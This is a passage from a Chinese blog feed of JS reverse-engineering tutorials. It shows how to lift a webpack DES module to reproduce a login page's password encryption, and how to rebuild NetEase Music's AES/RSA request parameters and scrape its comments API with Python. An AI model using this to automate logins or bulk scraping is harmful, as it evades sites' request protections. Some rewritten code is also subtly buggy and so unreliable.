href="mailto:&#97;&#100;&#x6d;&#x69;&#110;&#x40;&#49;&#50;&#51;&#x2e;&#99;&#x6f;&#109;&#48;&#48;&#x30;&#48;&#x30;&#x30;&#48;&#48;&#x30;&#x30;&#x30;">&#97;&#100;&#x6d;&#x69;&#110;&#x40;&#49;&#50;&#51;&#x2e;&#99;&#x6f;&#109;&#48;&#48;&#x30;&#48;&#x30;&#x30;&#48;&#48;&#x30;&#x30;&#x30;</a>“</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071629181.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071629502.png" alt="img"> </p><h2 id="4-加密函数分析"><a href="#4-加密函数分析" class="headerlink" title="4. 加密函数分析"></a>4. 加密函数分析</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071630272.png" alt="img"> </p><h3 id="1）根据代码可以初步判断为DES加密："><a href="#1）根据代码可以初步判断为DES加密：" class="headerlink" title="1）根据代码可以初步判断为DES加密："></a>1）根据代码可以初步判断为DES加密：</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071631831.png" alt="img"> </p><p>分析代码逻辑：</p><ul><li>只传入了一个参数：密码字段</li><li>前面都是var定义局部变量</li><li>关键加密代码：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l = p.a.TripleDES.encrypt(e, d, s);</span><br></pre></td></tr></table></figure><p>这块相当于对象一步步调用方法，所以，这块要先定位到对象 “p”</p><h3 id="2）向上找，定位到对象p"><a href="#2）向上找，定位到对象p" class="headerlink" title="2）向上找，定位到对象p"></a>2）向上找，定位到对象p</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l = t(&quot;3452&quot;)</span><br><span class="line">p = t.n(l)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071632338.png" alt="img"> </p><p>这块可以明显看到就是相当于webpack的方式，模块化调用</p><h3 id="3）将当前的整个代码复制下来放到notepad-中"><a href="#3）将当前的整个代码复制下来放到notepad-中" class="headerlink" title="3）将当前的整个代码复制下来放到notepad++中"></a>3）将当前的整个代码复制下来放到notepad++中</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071632355.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071632854.png" alt="img"> </p><h3 id="4）找到webpack代码的分发器（加载器）"><a href="#4）找到webpack代码的分发器（加载器）" class="headerlink" title="4）找到webpack代码的分发器（加载器）"></a>4）找到webpack代码的分发器（加载器）</h3><p>刷新页面，在刚刚打的断点p处停下<br>l &#x3D; t(“3452”) 中加载了用的加解密算法，我们，需要的就是DES的加密和解密算法</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071633160.png" alt="img"> </p><p>所以，接下来定位到 “<strong>t</strong>“ ，t就是我们要找的分发器：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071633295.png" alt="img"> </p><p>简单改写一下分发器：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fff</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">u</span>(<span class="params">n</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (r[n])</span><br><span class="line">            <span class="keyword">return</span> r[n].<span class="property">exports</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--&gt;&#x27;</span>,n)</span><br><span class="line">        <span class="keyword">var</span> t = r[n] = &#123;</span><br><span class="line">            <span class="attr">i</span>: n,</span><br><span class="line">            <span class="attr">l</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> e[n].<span class="title function_">call</span>(t.<span class="property">exports</span>, t, t.<span class="property">exports</span>, u),</span><br><span class="line">        t.<span class="property">l</span> = !<span class="number">0</span>,</span><br><span class="line">        t.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">    fff = u</span><br><span class="line">&#125;(&#123;</span><br><span class="line">   <span class="comment">//模块化代码填充</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="5）加密模块为”3452”，但是当前扣取到notepad-中的代码没有-3452-模块"><a href="#5）加密模块为”3452”，但是当前扣取到notepad-中的代码没有-3452-模块" class="headerlink" title="5）加密模块为”3452”，但是当前扣取到notepad++中的代码没有 3452 模块"></a>5）加密模块为”3452”，但是当前扣取到notepad++中的代码没有 3452 模块</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637070.png" alt="img"> </p><p>全局查找，定位到 “3452” 模块代码：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637902.png" alt="img"> </p><h3 id="6）扣取加密模块代码"><a href="#6）扣取加密模块代码" class="headerlink" title="6）扣取加密模块代码"></a>6）扣取加密模块代码</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637205.png" alt="img"> </p><p>将模块代码扣取出来。放到刚刚其前一步做好的加载器中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从&quot;00bb&quot;开始，扣取全部模块代码</span><br><span class="line"></span><br><span class="line">省略。。。</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637596.png" alt="img"> </p><h3 id="7）编写加密函数"><a href="#7）编写加密函数" class="headerlink" title="7）编写加密函数"></a>7）编写加密函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构建加密函数</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">fff</span>(<span class="string">&#x27;3452&#x27;</span>);   <span class="comment">//定义导出函数，将加密模块导出为全局变量p</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getUsername</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="comment">//用户名长度不够末尾自动补零</span></span><br><span class="line">   <span class="keyword">var</span> n = <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">1</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="variable language_">arguments</span>[<span class="number">1</span>] ? <span class="variable language_">arguments</span>[<span class="number">1</span>] : &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (e &amp;&amp; <span class="string">&quot;string&quot;</span> === <span class="keyword">typeof</span> e) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = n.<span class="property">text</span> || <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            r = n.<span class="property">length</span> || <span class="number">24</span>;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">length</span> &lt; r) </span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> a = e.<span class="property">length</span>; a &lt; r; a++)</span><br><span class="line">            e += t;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">          e = e.<span class="title function_">substring</span>(<span class="number">0</span>, r);</span><br><span class="line">      <span class="comment">//去除用户名中的空格</span></span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getPwd</span>(<span class="params">pwd,name</span>)&#123;</span><br><span class="line">  <span class="comment">//构建加密函数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//导出加密p对象</span></span><br><span class="line">  <span class="keyword">var</span> n = <span class="title function_">getUsername</span>(name)</span><br><span class="line">  , c = pwd</span><br><span class="line">  , d = p.<span class="property">enc</span>[<span class="string">&#x27;utf-8&#x27;</span>].<span class="title function_">parse</span>(n)</span><br><span class="line">  , l = &#123;</span><br><span class="line">    <span class="attr">mode</span>: p.<span class="property">mode</span>[<span class="string">&#x27;ECB&#x27;</span>],</span><br><span class="line">    <span class="attr">padding</span>: p.<span class="property">pad</span>[<span class="string">&#x27;pkcs7&#x27;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">  , s = p.<span class="property">DES</span>.<span class="title function_">encrypt</span>(c, d, l);</span><br><span class="line">  <span class="keyword">return</span> s.<span class="title function_">toString</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8）汇总一下代码"><a href="#8）汇总一下代码" class="headerlink" title="8）汇总一下代码"></a>8）<strong>汇总一下代码</strong></h3><p>参考后面第四部分，完整代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分发器代码+加密模块代码+自写加密函数代码</span><br></pre></td></tr></table></figure><h3 id="9）测试"><a href="#9）测试" class="headerlink" title="9）测试"></a>9）测试</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071639873.png" alt="img"> </p><h1 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h1><h2 id="1-第二个参数代码"><a href="#1-第二个参数代码" class="headerlink" title="1. 第二个参数代码"></a>1. 第二个参数代码</h2><p>作用：处理用户名（使用正则替换用户名中的任何空白字符【包括空格、制表符、换页符等等】为空，然后将用户名的长度使用 “0” 填充为 24位）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Q = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="variable language_">arguments</span>[<span class="number">0</span>] ? <span class="variable language_">arguments</span>[<span class="number">0</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">F = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> n = <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">1</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="variable language_">arguments</span>[<span class="number">1</span>] ? <span class="variable language_">arguments</span>[<span class="number">1</span>] : &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (e &amp;&amp; <span class="string">&quot;string&quot;</span> === <span class="keyword">typeof</span> e) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = n.<span class="property">text</span> || <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            r = n.<span class="property">length</span> || <span class="number">24</span>;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">length</span> &lt; r) <span class="keyword">for</span> (<span class="keyword">var</span> a = e.<span class="property">length</span>; a &lt; r; a++)</span><br><span class="line">        e += t;</span><br><span class="line">        <span class="keyword">else</span> e = e.<span class="title function_">substring</span>(<span class="number">0</span>, r);</span><br><span class="line">        <span class="keyword">return</span> e</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071640006.png" alt="img"> </p><h2 id="2-完整JS代码"><a href="#2-完整JS代码" class="headerlink" title="2. 完整JS代码"></a>2. 完整JS代码</h2><p>代码太多了，插入附件参考</p><p><a href="https://gitee.com/jingweihang/img/blob/master/hexo/202405/m.ctyun.cn.js">hexo&#x2F;202405&#x2F;m.ctyun.cn.js · 要优秀&#x2F;img - Gitee.com</a></p>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS逆向 </tag>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某music音乐评论解密</title>
      <link href="/2024/05/07/%E6%9F%90music%E9%9F%B3%E4%B9%90%E8%AF%84%E8%AE%BA%E8%A7%A3%E5%AF%86/"/>
      <url>/2024/05/07/%E6%9F%90music%E9%9F%B3%E4%B9%90%E8%AF%84%E8%AE%BA%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="常规分析"><a href="#常规分析" class="headerlink" title="常规分析"></a>常规分析</h1><p>这块很多步骤参考原作者文章，地址如下：</p><p><a href="https://mp.weixin.qq.com/s/loXsmR8uhrtFA_3EuBQB8w">https://mp.weixin.qq.com/s/loXsmR8uhrtFA_3EuBQB8w</a></p><h2 id="目标地址"><a href="#目标地址" class="headerlink" title="目标地址"></a>目标地址</h2><p>aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvc29uZz9pZD0yMDYxOTc4OTYx</p><h2 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h2><p>1、获取评论接口为<a href="https://music.163.com/weapi/comment/resource/comments/get?csrf_token=">https://music.163.com/weapi/comment/resource/comments/get?csrf_token=</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405070950955.png" alt="image.png"> </p><p>2、POST请求，里面有两个参数 “<strong>params</strong>“和”<strong>encSecKey</strong>“</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071105575.png" alt="image.png"> </p><p>尝试多次请求，发现这两个参数值是一直变化的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071106618.png" alt="image.png"> </p><h2 id="分析参数"><a href="#分析参数" class="headerlink" title="分析参数"></a>分析参数</h2><p>按照以往的抓取经验来说，它们大概率是在一起的，因此可以通过全局搜索<strong>encSecKey</strong>这个词汇。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071106426.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var bKL9C = window.asrsea(JSON.stringify(i6c), bvl1x([&quot;流泪&quot;, &quot;强&quot;]), bvl1x(Rj5o.md), bvl1x([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;]));</span><br><span class="line">e6c.data = j6d.cq6k(&#123;</span><br><span class="line">  params: bKL9C.encText,</span><br><span class="line">  encSecKey: bKL9C.encSecKey</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>打断点调试一下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071107423.png" alt="fae1bc4fedfcd635849bfcf0d8c47326.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071107384.png" alt="d296bd02b2adf2c40ac2011ddc78fd5a.png"> </p><p>成功定位到参数的具体位置。。。</p><h2 id="寻找加密函数"><a href="#寻找加密函数" class="headerlink" title="寻找加密函数"></a>寻找加密函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var bKL9C = window.asrsea(JSON.stringify(i6c), bvl1x([&quot;流泪&quot;, &quot;强&quot;]), bvl1x(Rj5o.md), bvl1x([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;]));</span><br><span class="line">e6c.data = j6d.cq6k(&#123;</span><br><span class="line">  params: bKL9C.encText,</span><br><span class="line">  encSecKey: bKL9C.encSecKey</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>加密函数应该就是asrsea，在里面一共要传递四个参数。我们可以看看这四个参数分别是什么？</p><p>点击翻页，然后断点下来后查看参数值：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071108857.png" alt="img"> </p><p>由上图可以发现，这四个参数中，分别找了两个数据包来判断，它们会不会有什么变化，变化的值是<strong>pageNo。</strong></p><p>当然了，这里除了pageNo之外，还有cursor也是变化的，它代表的是时间戳。</p><p>意味着即使是相同的页面<strong>params</strong>和<strong>encSecKey</strong>的值也是时时刻刻都在发生变化的。</p><h2 id="进入加密函数"><a href="#进入加密函数" class="headerlink" title="进入加密函数"></a>进入加密函数</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071109485.png" alt="img"> </p><p>进来之后，函数套函数，开始补全js代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function d(d, e, f, g) &#123;</span><br><span class="line">        var h = &#123;&#125;</span><br><span class="line">          , i = a(16);</span><br><span class="line">        return h.encText = b(d, g),</span><br><span class="line">        h.encText = b(h.encText, i),</span><br><span class="line">        h.encSecKey = c(i, e, f),</span><br><span class="line">        h</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071109254.png" alt="image.png"> </p><p>里面包含了</p><ul><li>函数a</li><li>函数b</li><li>函数c</li></ul><h3 id="函数a"><a href="#函数a" class="headerlink" title="函数a"></a>函数a</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function a(a) &#123;</span><br><span class="line">        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span><br><span class="line">        for (d = 0; a &gt; d; d += 1)</span><br><span class="line">            e = Math.random() * b.length,</span><br><span class="line">            e = Math.floor(e),</span><br><span class="line">            c += b.charAt(e);</span><br><span class="line">        return c</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>不难看出，<strong>它的主要作用是生成16位随机字符</strong></p><p>简单做个修改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function a(length)&#123;</span><br><span class="line">    let d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span><br><span class="line">    for (d = 0; length &gt; d; d += 1)&#123;</span><br><span class="line">        e = Math.random() * b.length;</span><br><span class="line">        e = Math.floor(e);</span><br><span class="line">        c += b.charAt(e);</span><br><span class="line">    &#125;</span><br><span class="line">    return c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let result = a(16);</span><br></pre></td></tr></table></figure><h3 id="函数b"><a href="#函数b" class="headerlink" title="函数b"></a>函数b</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function b(a, b) &#123;</span><br><span class="line">        var c = CryptoJS.enc.Utf8.parse(b)</span><br><span class="line">          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)</span><br><span class="line">          , e = CryptoJS.enc.Utf8.parse(a)</span><br><span class="line">          , f = CryptoJS.AES.encrypt(e, c, &#123;</span><br><span class="line">            iv: d,</span><br><span class="line">            mode: CryptoJS.mode.CBC</span><br><span class="line">        &#125;);</span><br><span class="line">        return f.toString()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接下来，就来解释一下，这段代码的意思。</p><p>a代表的是你要加密的字符串，b代表密钥。它的基本作用是利用AES加密算法配合CBC模式的加密过程，最后以base64的形式输出</p><p>简单修改一下，上述代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function generateRandomString(length)&#123;</span><br><span class="line">    let d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span><br><span class="line">    for (d = 0; length &gt; d; d += 1)&#123;</span><br><span class="line">        e = Math.random() * b.length;</span><br><span class="line">        e = Math.floor(e);</span><br><span class="line">        c += b.charAt(e);</span><br><span class="line">    &#125;</span><br><span class="line">    return c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 获取AES加密数据</span><br><span class="line">const CryptoJS = require(&quot;crypto-js&quot;)</span><br><span class="line">function encryptMessage(message, key) &#123;</span><br><span class="line">    let keyUtf8 = CryptoJS.enc.Utf8.parse(key);</span><br><span class="line">    let iv = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;);</span><br><span class="line">    let messageUtf8 = CryptoJS.enc.Utf8.parse(message);</span><br><span class="line">    let encrypted = CryptoJS.AES.encrypt(messageUtf8, keyUtf8, &#123;</span><br><span class="line">        iv: iv,</span><br><span class="line">        mode: CryptoJS.mode.CBC&#125;);</span><br><span class="line">    return encrypted.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let message = &#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;3&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1708238561030&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;;</span><br><span class="line">let key = generateRandomString(16);</span><br><span class="line">let encrypyResult = encryptMessage(message, &quot;0CoJUm6Qyw8W8jud&quot;)</span><br><span class="line">// console.log(encrypyResult)</span><br><span class="line">let encText = encryptMessage(encrypyResult, key)</span><br><span class="line">console.log(encText)</span><br></pre></td></tr></table></figure><h3 id="函数c"><a href="#函数c" class="headerlink" title="函数c"></a>函数c</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function c(a, b, c) &#123;</span><br><span class="line">        var d, e;</span><br><span class="line">        return setMaxDigits(131),</span><br><span class="line">        d = new RSAKeyPair(b,&quot;&quot;,c),</span><br><span class="line">        e = encryptedString(d, a)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段代码里面分别有三个函数，得把这三个函数给补全了</p><p>首先来补全setMaxDigits函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setMaxDigits(a) &#123;</span><br><span class="line">    maxDigits = a,</span><br><span class="line">    ZERO_ARRAY = new Array(maxDigits);</span><br><span class="line">    for (var b = 0; b &lt; ZERO_ARRAY.length; b++)</span><br><span class="line">        ZERO_ARRAY[b] = 0;</span><br><span class="line">    bigZero = new BigInt,</span><br><span class="line">    bigOne = new BigInt,</span><br><span class="line">    bigOne.digits[0] = 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一点需要注意一下，BigInt并不是JavaScript内置的类型，而是自定义的，因此我们需要找到它。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function BigInt(a) &#123;</span><br><span class="line">    this.digits = &quot;boolean&quot; == typeof a &amp;&amp; 1 == a ? null : ZERO_ARRAY.slice(0),</span><br><span class="line">    this.isNeg = !1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述两段代码的作用应该是用于做一些运算相关的动作。具体的事情我们也不必深究，接下来要做的事情就是将两个函数合并起来。修改后如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function BigInt(value) &#123;</span><br><span class="line">    let ZERO_ARRAY = new Array(maxDigits);</span><br><span class="line">    this.digits = &quot;boolean&quot; == typeof a &amp;&amp; 1 == value ? null : ZERO_ARRAY.slice(0),</span><br><span class="line">    this.isNeg = !1</span><br><span class="line">&#125;</span><br><span class="line">function setMaxDigits(value) &#123;</span><br><span class="line">    let maxDigits = value;</span><br><span class="line">    let ZERO_ARRAY = new Array(maxDigits);</span><br><span class="line">    for (let i = 0; i &lt; ZERO_ARRAY.length; i++) &#123;</span><br><span class="line">            ZERO_ARRAY[i] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">    let bigZero = new BigInt(131); // 传递false代表我们希望初始化为0的BigInt对象</span><br><span class="line">    let bigOne = new BigInt(131);</span><br><span class="line">    bigOne.digits[0] = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>紧接着分析RSAKeyPair函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function RSAKeyPair(a, b, c) &#123;</span><br><span class="line">    this.e = biFromHex(a),</span><br><span class="line">    this.d = biFromHex(b),</span><br><span class="line">    this.m = biFromHex(c),</span><br><span class="line">    this.chunkSize = 2 * biHighIndex(this.m),</span><br><span class="line">    this.radix = 16,</span><br><span class="line">    this.barrett = new BarrettMu(this.m)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>剩下的就不细说了，继续往前补全就行。。。。</p><h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function get_post_data(i3x) &#123;</span><br><span class="line">    e = &#x27;010001&#x27;</span><br><span class="line">    f = &#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span><br><span class="line">    g = &#x27;0CoJUm6Qyw8W8jud&#x27;</span><br><span class="line">    return  bVg1x = asrsea(JSON.stringify(i3x), e, f, g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let i3x = &#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;1&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;-1&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;;</span><br><span class="line">let result1 = get_post_data(i3x)</span><br><span class="line">console.log(result1)</span><br></pre></td></tr></table></figure><p><strong>python</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;authority&quot;</span>: <span class="string">&quot;music.xxx.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cache-control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">    <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://music.xxx.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">    <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://music.xxx.com/outchain/player?type=2&amp;id=2051548110&amp;auto=1&amp;height=66&amp;bg=e8e8e8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;119\&quot;, \&quot;Chromium\&quot;;v=\&quot;119\&quot;, \&quot;Not?A_Brand\&quot;;v=\&quot;24\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua-platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-fetch-dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-fetch-mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-fetch-site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;csrf_token&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xzwy.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    js = f.read()</span><br><span class="line">cursor = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">i3x = &#123;<span class="string">&quot;rid&quot;</span>:<span class="string">&quot;R_SO_4_2061978961&quot;</span>,<span class="string">&quot;threadId&quot;</span>:<span class="string">&quot;R_SO_4_2061978961&quot;</span>,<span class="string">&quot;pageNo&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;pageSize&quot;</span>:<span class="string">&quot;20&quot;</span>,<span class="string">&quot;cursor&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;cursor&#125;</span>&quot;</span>,<span class="string">&quot;offset&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;orderType&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;csrf_token&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"><span class="comment"># print(i3x)</span></span><br><span class="line">result = execjs.<span class="built_in">compile</span>(js).call(<span class="string">&#x27;get_post_data&#x27;</span>, i3x)</span><br><span class="line">encText = result.get(<span class="string">&#x27;encText&#x27;</span>)</span><br><span class="line">encSecKey = 